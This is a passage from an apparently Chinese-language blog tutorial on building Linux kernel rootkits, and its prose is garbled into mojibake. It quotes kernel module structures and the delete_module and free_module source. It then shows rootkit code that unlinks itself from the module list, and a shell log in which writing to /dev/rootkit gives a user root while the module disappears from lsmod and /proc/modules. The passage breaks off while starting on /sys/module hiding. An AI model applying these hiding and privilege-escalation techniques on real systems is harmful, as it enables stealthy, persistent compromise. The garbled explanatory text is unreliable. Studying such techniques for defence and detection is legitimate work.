class="title">notes_attrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The command line arguments (may be mangled).  People like</span></span><br><span class="line"><span class="comment">   keeping pointers to this stuff */</span></span><br><span class="line"><span class="keyword">char</span> *args;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="comment">/* Per-cpu data. */</span></span><br><span class="line"><span class="keyword">void</span> __percpu *percpu;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> percpu_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">void</span> *noinstr_text_start;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> noinstr_text_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACEPOINTS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_tracepoints;</span><br><span class="line"><span class="keyword">tracepoint_ptr_t</span> *tracepoints_ptrs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TREE_SRCU</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_srcu_structs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">srcu_struct</span> **<span class="title">srcu_struct_ptrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_EVENTS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_bpf_raw_events;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_raw_event_map</span> *<span class="title">bpf_raw_events</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_INFO_BTF_MODULES</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> btf_data_size;</span><br><span class="line"><span class="keyword">void</span> *btf_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_JUMP_LABEL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jump_entry</span> *<span class="title">jump_entries</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_jump_entries;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACING</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_bprintk_fmt;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> **trace_bprintk_fmt_start;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EVENT_TRACING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trace_event_call</span> **<span class="title">trace_events</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_events;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trace_eval_map</span> **<span class="title">trace_evals</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_evals;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FTRACE_MCOUNT_RECORD</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ftrace_callsites;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *ftrace_callsites;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KPROBES</span></span><br><span class="line"><span class="keyword">void</span> *kprobes_text_start;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> kprobes_text_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *kprobe_blacklist;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_kprobe_blacklist;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HAVE_STATIC_CALL_INLINE</span></span><br><span class="line"><span class="keyword">int</span> num_static_call_sites;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">static_call_site</span> *<span class="title">static_call_sites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_KUNIT)</span></span><br><span class="line"><span class="keyword">int</span> num_kunit_suites;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kunit_suite</span> **<span class="title">kunit_suites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LIVEPATCH</span></span><br><span class="line"><span class="keyword">bool</span> klp; <span class="comment">/* Is this a livepatch module? */</span></span><br><span class="line"><span class="keyword">bool</span> klp_alive;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ELF information */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">klp_modinfo</span> *<span class="title">klp_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PRINTK_INDEX</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> printk_index_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pi_entry</span> **<span class="title">printk_index_start</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_UNLOAD</span></span><br><span class="line"><span class="comment">/* What modules depend on me? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">source_list</span>;</span></span><br><span class="line"><span class="comment">/* What modules do I depend on? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">target_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Destruction function. */</span></span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">exit</span>)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> refcnt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSTRUCTORS</span></span><br><span class="line"><span class="comment">/* Constructor functions. */</span></span><br><span class="line"><span class="keyword">ctor_fn_t</span> *ctors;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ctors;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FUNCTION_ERROR_INJECTION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">error_injection_entry</span> *<span class="title">ei_funcs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ei_funcs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_DEBUG_CORE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ddebug_info</span> <span class="title">dyndbg_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; ____cacheline_aligned __randomize_layout;</span><br></pre></td></tr></table></figure><p>é‡Œé¢åŒ…å«äº†<code>module</code>ä¿¡æ¯çš„ä¸€äº›æˆå‘˜ï¼Œå¹¶ä¸”å¤šä¸ªå†…æ ¸æ¨¡å—æ˜¯é€šè¿‡ä¸Šé¢ç»“æ„ä½“ä¸­çš„<code>list</code>æˆå‘˜æ„æˆçš„åŒå‘é“¾è¡¨ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">&#123;</span><br><span class="line">  unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">  <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨lkmç¼–ç¨‹ä¸­ï¼Œå¯ä»¥æ³¨æ„åˆ°çš„æ—¶å€™è¿™é‡Œåˆ›å»º<code>class</code>æ—¶ä½¿ç”¨<code>THIS_MODULE</code>å®šä½äº†å½“å‰çš„æ¨¡å—ï¼Œå±•å¼€å…¶å®šä¹‰å…¶å®å°±æ˜¯<code>(&amp;__this_module)</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE (&amp;__this_module)</span></span><br></pre></td></tr></table></figure><p>å‰é¢æåˆ°/proc/modulesçš„å†…å®¹æ¥è‡ªå†…æ ¸ä¸­ä¸Šè¿°çš„åŒå‘é“¾è¡¨ç»“æ„ä¸­ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©æˆ‘ä»¬çš„<code>rootkit</code>è„±é“¾å³å¯å®Œæˆéšè—æ“ä½œã€‚</p><p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯è¿™é‡Œçš„<code>list</code>æˆå‘˜å®šä¹‰çš„ç»“æ„æ˜¯<code>list_head</code>ç»“æ„ï¼Œè€Œè¯¥ç±»å‹çš„æˆå‘˜åœ¨ä»¥å¾€çš„å†…æ ¸æ–‡ç« ä¸­åº”è¯¥ä»‹ç»è¿‡å¯ä»¥ä½¿ç”¨<code>list_del_rcu</code>å‡½æ•°ç›´æ¥è¿›è¡Œåˆ é™¤ï¼Œä¸è¿‡è¿™é‡Œæ˜¯å†…æ ¸ç¯å¢ƒæ‰€ä»¥è€ƒè™‘å¤šçº¿ç¨‹æ“ä½œçš„å½±å“æ˜¯å¿…è¦çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(delete_module, <span class="keyword">const</span> <span class="keyword">char</span> __user *, name_user,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line"><span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line"><span class="keyword">char</span> buf[MODULE_FLAGS_BUF_SIZE];</span><br><span class="line"><span class="keyword">int</span> ret, forced = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!capable(CAP_SYS_MODULE) || modules_disabled)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strncpy_from_user(name, name_user, MODULE_NAME_LEN<span class="number">-1</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">name[MODULE_NAME_LEN<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">audit_log_kern_module(name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mutex_lock_interruptible(&amp;module_mutex) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">mod = find_module(name);</span><br><span class="line"><span class="keyword">if</span> (!mod) &#123;</span><br><span class="line">ret = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;mod-&gt;source_list)) &#123;</span><br><span class="line"><span class="comment">/* Other modules depend on us: get rid of them first. */</span></span><br><span class="line">ret = -EWOULDBLOCK;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Doing init or already dying? */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;state != MODULE_STATE_LIVE) &#123;</span><br><span class="line"><span class="comment">/* <span class="doctag">FIXME:</span> if (force), slam module count damn the torpedoes */</span></span><br><span class="line">pr_debug(<span class="string">&quot;%s already dying\n&quot;</span>, mod-&gt;name);</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If it has an init func, it must have an exit func to unload */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;init &amp;&amp; !mod-&gt;<span class="built_in">exit</span>) &#123;</span><br><span class="line">forced = try_force_unload(flags);</span><br><span class="line"><span class="keyword">if</span> (!forced) &#123;</span><br><span class="line"><span class="comment">/* This module can&#x27;t be removed */</span></span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = try_stop_module(mod, flags, &amp;forced);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"><span class="comment">/* Final destruction now no one is using it. */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;<span class="built_in">exit</span> != <span class="literal">NULL</span>)</span><br><span class="line">mod-&gt;<span class="built_in">exit</span>();</span><br><span class="line">blocking_notifier_call_chain(&amp;module_notify_list,</span><br><span class="line">     MODULE_STATE_GOING, mod);</span><br><span class="line">klp_module_going(mod);</span><br><span class="line">ftrace_release_mod(mod);</span><br><span class="line"></span><br><span class="line">async_synchronize_full();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Store the name and taints of the last unloaded module for diagnostic purposes */</span></span><br><span class="line">strscpy(last_unloaded_module.name, mod-&gt;name, <span class="keyword">sizeof</span>(last_unloaded_module.name));</span><br><span class="line">strscpy(last_unloaded_module.taints, module_flags(mod, buf, <span class="literal">false</span>), <span class="keyword">sizeof</span>(last_unloaded_module.taints));</span><br><span class="line"></span><br><span class="line">free_module(mod);</span><br><span class="line"><span class="comment">/* someone could wait for the module in add_unformed_module() */</span></span><br><span class="line">wake_up_all(&amp;module_wq);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç æ˜¯<code>rmmod</code>èƒŒåè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨<code>delete_module</code>çš„å†…éƒ¨å®ç°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">trace_module_free(mod);</span><br><span class="line"></span><br><span class="line">mod_sysfs_teardown(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We leave it in list to prevent duplicate loads, but make sure</span></span><br><span class="line"><span class="comment"> * that noone uses it while it&#x27;s being deconstructed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mutex_lock(&amp;module_mutex);</span><br><span class="line">mod-&gt;state = MODULE_STATE_UNFORMED;</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Arch-specific cleanup. */</span></span><br><span class="line">module_arch_cleanup(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Module unload stuff */</span></span><br><span class="line">module_unload_free(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any allocated parameters. */</span></span><br><span class="line">destroy_params(mod-&gt;kp, mod-&gt;num_kp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_livepatch_module(mod))</span><br><span class="line">free_module_elf(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we can delete it from the lists */</span></span><br><span class="line">mutex_lock(&amp;module_mutex);</span><br><span class="line"><span class="comment">/* Unlink carefully: kallsyms could be walking list. */</span></span><br><span class="line">list_del_rcu(&amp;mod-&gt;<span class="built_in">list</span>);</span><br><span class="line">mod_tree_remove(mod);</span><br><span class="line"><span class="comment">/* Remove this module from bug list, this uses list_del_rcu */</span></span><br><span class="line">module_bug_cleanup(mod);</span><br><span class="line"><span class="comment">/* Wait for RCU-sched synchronizing before releasing mod-&gt;list and buglist. */</span></span><br><span class="line">synchronize_rcu();</span><br><span class="line"><span class="keyword">if</span> (try_add_tainted_module(mod))</span><br><span class="line">pr_err(<span class="string">&quot;%s: adding tainted module to the unloaded tainted modules list failed.\n&quot;</span>,</span><br><span class="line">       mod-&gt;name);</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This may be empty, but that&#x27;s OK */</span></span><br><span class="line">module_arch_freeing_init(mod);</span><br><span class="line">kfree(mod-&gt;args);</span><br><span class="line">percpu_modfree(mod);</span><br><span class="line"></span><br><span class="line">free_mod_mem(mod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>list_del_rcu</code>å‡½æ•°ç›´æ¥å¯¹å…¶è¿›è¡Œè„±é“¾æ“ä½œï¼Œå°½ç®¡å…¶æ˜¯rcuå®‰å…¨çš„åœ¨å‰åä¹Ÿéƒ½æ˜¯åŠ äº†é”ä¿å¹³å®‰çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨å®ç°è„±é“¾æ“ä½œæ—¶ä¹Ÿéœ€è¦è¿›è¡Œç›¸åº”çš„åŠ é”æ“ä½œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span> =</span> (&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">    mutex_lock(&amp;module_mutex);</span><br><span class="line">    <span class="built_in">list</span>-&gt;prev-&gt;next = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">    <span class="built_in">list</span>-&gt;next-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">    mutex_unlock(&amp;module_mutex);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨initæ—¶åšä¸€ä¸‹æ“ä½œå³å¯å®ç°è„±é“¾æ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ lsmod </span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># lsmod </span></span><br><span class="line">~ <span class="comment"># cat /proc/modules | grep &#x27;rootkit&#x27;</span></span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>å‘ç°æ— è®ºæ˜¯<code>lsmod</code>è¿˜æ˜¯ç›´æ¥æŸ¥çœ‹<code>/proc/modules</code>æ–‡ä»¶éƒ½æ— æ³•æŸ¥çœ‹åˆ°<code>rootkit</code>ç›¸å…³ä¿¡æ¯äº†ï¼Œä½†æ˜¯ä¾æ—§ä¸ä¼šå½±å“æˆ‘ä»¬ææƒæ“ä½œã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„<code>delete_module</code>ç³»ç»Ÿè°ƒç”¨ä¸­æåˆ°åœ¨æ­£å¸¸å¸è½½ä¸€ä¸ªæ¨¡å—æ—¶æ˜¯éœ€è¦è„±é“¾æ“ä½œçš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¨¡å—æ— æ³•å°†å…¶å¸è½½äº†ã€‚</strong></p><h3 id="sys-module-ä¿¡æ¯éšè—"><a href="#sys-module-ä¿¡æ¯éšè—" class="headerlink" title="/sys/module/ä¿¡æ¯éšè—"></a>/sys/module/ä¿¡æ¯éšè—</h3><p>sysfsä¸procfsç›¸ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯ä¸€ä¸ªåŸºäºRAMçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å†…æ ¸ä¿¡æ¯ä»¥æ–‡ä»¶çš„æ–¹å¼æä¾›ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬æˆ‘ä»¬çš„ rootkit æ¨¡å—ä¿¡æ¯ï¼Œsysfs ä¼šåŠ¨æ€è¯»å–å†…æ ¸ä¸­çš„ kobject å±‚æ¬¡ç»“æ„å¹¶åœ¨ <code>/sys/module/</code> ç›®å½•ä¸‹ç”Ÿæˆæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/</span><br><span class="line">8250                intel_idle          shpchp</span><br><span class="line">acpi                intel_pmc_core      slab_common</span><br><span class="line">acpi_cpufreq        ipv6                spurious</span><br><span class="line">acpiphp             kdb                 sr_mod</span><br><span class="line">apparmor            kernel              srcutree</span><br><span class="line">ata_generic         keyboard            <span class="built_in">suspend</span></span><br><span class="line">ata_piix            kgdb_nmi            sysrq</span><br><span class="line">battery             kgdboc              tcp_cubic</span><br><span class="line">blk_cgroup          libata              thermal</span><br><span class="line">blk_crypto          libnvdimm           tpm</span><br><span class="line">block               loop                tpm_crb</span><br><span class="line">button              md_mod              tpm_tis</span><br><span class="line">configfs            module              tpm_tis_core</span><br><span class="line">cpufreq             mousedev            uhci_hcd</span><br><span class="line">cpuidle             netpoll             usbcore</span><br><span class="line">crc_t10dif          nmi_backtrace       uv_nmi</span><br><span class="line">cryptomgr           page_alloc          vfio</span><br><span class="line">debug_core          pata_sis            vfio_iommu_type1</span><br><span class="line">device_hmem         pcc_cpufreq         vfio_pci</span><br><span class="line">dm_mod              pci_hotplug         vfio_virqfd</span><br><span class="line">dns_resolver        pcie_aspm           virtio_mmio</span><br><span class="line">dynamic_debug       pciehp              virtio_pci</span><br><span class="line">edac_core           ppp_generic         virtual_root</span><br><span class="line">edd                 printk              vt</span><br><span class="line">efivars             processor           watchdog</span><br><span class="line">ehci_hcd            pstore              workqueue</span><br><span class="line">eisa_bus            random              xen</span><br><span class="line">fb                  rcupdate            xen_acpi_processor</span><br><span class="line">firmware_class      rcutree             xen_blkfront</span><br><span class="line">fscrypto            rfkill              xen_netfront</span><br><span class="line">fuse                rng_core            xhci_hcd</span><br><span class="line">gpiolib_acpi        rootkit             xz_dec</span><br><span class="line">haltpoll            rtc_cmos            zswap</span><br><span class="line">i8042               scsi_mod</span><br><span class="line">ima                 sg</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>Kobject æ˜¯ Linux ä¸­çš„è®¾å¤‡æ•°æ®ç»“æ„åŸºç±»ï¼Œåœ¨å†…æ ¸ä¸­ä¸º <code>struct kobject</code> ç»“æ„ä½“ï¼Œé€šå¸¸å†…åµŒåœ¨å…¶ä»–æ•°æ®ç»“æ„ä¸­ï¼›æ¯ä¸ªè®¾å¤‡éƒ½æœ‰ä¸€ä¸ª kobject ç»“æ„ä½“ï¼Œå¤šä¸ª kobject é—´é€šè¿‡å†…æ ¸åŒå‘é“¾è¡¨è¿›è¡Œé“¾æ¥ï¼›kobject ä¹‹é—´æ„æˆå±‚æ¬¡ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 